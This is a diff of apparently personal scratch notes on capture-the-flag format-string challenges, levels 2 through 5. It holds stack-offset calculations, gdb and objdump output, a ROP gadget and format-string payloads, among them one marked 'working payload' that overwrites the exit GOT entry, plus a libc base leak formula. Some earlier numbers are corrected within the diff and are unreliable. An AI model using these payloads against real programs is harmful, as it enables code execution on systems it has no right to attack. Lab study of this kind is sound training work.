@@ -29,7 +29,7 @@ if your padding is 0x20 (32), that is 4 memory blocks
 payload string would occupy 16 bytes = 2 memory blocks
 and printf will start to look from 6th position in stack
 
-4 + 2 + 2 + 6 = 14
+4 + 2 + 2 + 6 = 14$
 
 ============================== 2 =========================================
 0x1d0 = 464 / 8 = 58
@@ -133,7 +133,7 @@ gef➤  x/s $rdi
 0x7ffd42120fb0 (rdi) - 0x7ffd42120dd0(rsp) = 480/8 = 60
 60 + 122/8 (input) + 6 = 60 + 15 + 6 = 81, 2 remiander
 win_addr_val = rip_func - 0x1735 + 0x1330
-
+0xe330 - 122 = 58038
 ============ ch 4=========
 0000000000401150 <memset@plt>:
   401150:       f3 0f 1e fa             endbr64 
@@ -262,13 +262,15 @@ rbp            0x7ffecc553ba0
 58078    
 
 0x7fff3a1c1640 - 0x7fff3a1c14d0 = 368/8=46 (rdi-rsp)/8=368/8=46
-46+6+10(82/8)=72 + 2 remiander 
-payload=b"%058078d%74$hn"+p64(rip_func)
+46+6+10(82/8)=62 + 2 remiander 
+payload=b"%058078d%64$hn"+p64(rip_func)
 
 ================= 5 =====================
+ b *func+66
+ b *func+344
 <+341>:   call   0x40129d <func>
 <+344>:   call   0x401110 <printf@plt>
-0x7ffe03718390 - 0x7ffe03717f10 = rbp -rsp = 1152/8=144
+0x7ffe03718390 - 0x7ffe03717f10 = rbp -rsp = 1152/8=144 = rbp func - rsp func
 0x7ffe49d3f530 - 0x7ffe49d3f4e0 = 80 (rbp main - rbp func)
 0x7fffad1fd4c0: "Your input is:", ' ' <repeats 26 times>, "\n%150$p\n%150$p\n"  // gef➤  x/s $rdi  = 14+26+1(new line char)=41
 
@@ -278,6 +280,72 @@ payload=b"%058078d%74$hn"+p64(rip_func)
   40116b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
 
 rdi - rsp = 0x7ffdaa7d4b90 - 0x7ffdaa7d4b30 = 96/8 = 12
-12 + 6 (for stack args) + 41 / 8 (input string) = 18 + 5 = 23 and 1 remiander
 
-payload = %0
+41 
+12 + 6 (for stack args) + 41 / 8 (input string) = 18 + 5 = 23 and 1 remiander = 24 is positional argument
+
+10 + 2 + 2 (payload string) + 6 = 20$ # not consideration
+000000000040129d <func>: = 4199069
+char padding[0x50] = 80 / 8 = 10
+4199069 - 41 = 4199028
+payload = "%04199028d%20$ln" + p64(0x404060) #exit got -> func
+
+f = FmtStr(send_fmt_payload, offset=24, padlen=7, numbwritten=41)
+
+0x7ffd6a2afbb0 - 0x7ffd6a2af730 = rbp - rsp = 1152/8 = 144
+
+0x7fffcdf4db80 - 0x7fffcdf4db30 = rbp main - func = 80
+
+0x00007f37af6b6000 0x00007f37af6d8000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ff5462e3000
+
+00000000004010e0 <puts@plt>:
+  4010e0:	f3 0f 1e fa          	endbr64 
+  4010e4:	f2 ff 25 35 2f 00 00 	bnd jmpq *0x2f35(%rip)        # 404020 <puts@GLIBC_2.2.5>
+  4010eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+
+  0x00000000004015d3 : pop rdi ; ret  // ROPgadget --binary ./babyformat_level5 --only "pop|ret"
+
+  hacker@format-string-level-5:/challenge$ objdump -T /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep puts
+0000000000084420 g    DF .text	00000000000001dc  GLIBC_2.2.5 _IO_puts
+0000000000084420  w   DF .text	00000000000001dc  GLIBC_2.2.5 puts     #considered
+0000000000124330 g    DF .text	00000000000004f4  GLIBC_2.2.5 putspent
+0000000000126000 g    DF .text	00000000000002d8  GLIBC_2.10  putsgent
+0000000000082ce0  w   DF .text	0000000000000180  GLIBC_2.2.5 fputs
+0000000000082ce0 g    DF .text	0000000000000180  GLIBC_2.2.5 _IO_fputs
+000000000008e320  w   DF .text	000000000000009f  GLIBC_2.2.5 fputs_unlocked
+
+readelf -s /lib/x86_64-linux-gnu/libc.so.6  // symbol table of libc.so.6
+
+The output of the readelf -s command on the libc.so.6 file typically includes a list of symbols defined in the library, as well as their addresses, sizes, and other information. Some of the commonly used symbols in the libc library include:
+
+printf, scanf, and other functions from the standard C library
+system, execve, and other system calls
+__libc_start_main, which is the entry point of most C programs on Linux
+exit, exit_group, and other functions for terminating a process
+malloc, calloc, realloc, and other memory management functions
+
+hacker@format-string-level-5:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
+  2238: 0000000000023f90   483 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.2.5
+
+base = int(leak[:-1],16) - 0x23f90 - 0xF3
+
+
+working payload = payload = b"%04199028d%26$lnAAAAAAA" + p64(0x404060) 
+
+0x7ffe9d5390e0(prev func rbp)-0x7ffe9d538c50(new func rbp)=1168
+0x7ffeb07645d0 - 0x7ffeb0764150 = 1152 (rbp func - rsp func)
+
+rbp            0x7ffc0af656a0
+rsp            0x7ffc0af65220  0x7ffc0af65220
+
+rbp            0x7ffc0af65210
+rsp            0x7ffc0af64d90
+
+(rdi-rsp)/8 + 6 + (leadin string length+padding to align)/8
+The numbwritten = the leading bytes of the text already written + any padding you add
+
+
+======================== 6 =========================================
+
+================================ 7 =================================
